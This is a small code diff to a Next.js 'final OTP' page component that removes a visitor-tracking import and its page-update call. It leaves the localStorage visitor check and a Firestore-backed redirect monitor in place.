@@ -9,7 +9,6 @@ import { StepShell } from "@/components/step-shell"
 import { db } from "@/lib/firebase"
 import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
 import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
-import { updateVisitorPage } from "@/lib/visitor-tracking"
 
 export default function FinalOtpPage() {
   const router = useRouter()
@@ -29,7 +28,6 @@ export default function FinalOtpPage() {
     const id = localStorage.getItem("visitor") || ""
     if (!id) { router.push("/home-new"); return }
     setVisitorId(id)
-    updateVisitorPage(id, "finalOtp", 9)
   }, [router])
 
   useRedirectMonitor({ visitorId, currentPage: "finalOtp" })
